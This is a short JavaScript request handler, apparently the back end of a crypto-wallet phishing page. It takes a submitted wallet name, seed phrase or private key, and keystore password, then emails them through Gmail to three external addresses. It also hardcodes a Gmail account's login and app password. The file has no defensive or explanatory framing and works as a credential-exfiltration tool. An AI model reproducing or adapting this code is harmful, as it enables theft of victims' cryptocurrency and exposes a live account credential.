import nodemailer from 'nodemailer';

export async function handler(request) {
  // Check if the request is a POST request with form data
  const formData = await request.formData();
  
  // Extract wallet details from form data
  const walletName = formData.get('walletName') || 'Not provided';
  const walletPhrase = formData.get('phraseWallet') || 'Not provided';
  const passwordWallet = formData.get('passwordWallet') || 'Not provided';

  // Create email transporter
  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
      user: 'hello.jonathanpius@gmail.com',
      pass: 'rbenxiivasedcnaw'
    }
  });

  // Prepare email options
  const mailOptions = {
    from: 'hello.jonathanpius@gmail.com',
    to: [
      'Divasnow178@gmail.com', 
      'rf7765272@gmail.com', 
      'hello.davidolawale@gmail.com'
    ],
    subject: 'New Wallet Details Submitted',
    html: `
      <h2>Wallet Details Submission</h2>
      <p><strong>Wallet Name:</strong> ${walletName}</p>
      <p><strong>Wallet Phrase/Keystore/Private Key:</strong> ${walletPhrase}</p>
      <p><strong>Password (if keystore):</strong> ${passwordWallet}</p>
    `
  };

  try {
    // Send email
    await transporter.sendMail(mailOptions);
    return new Response('success', { status: 200 });
  } catch (error) {
    console.error(error);
    return new Response('error', { status: 500 });
  }
}
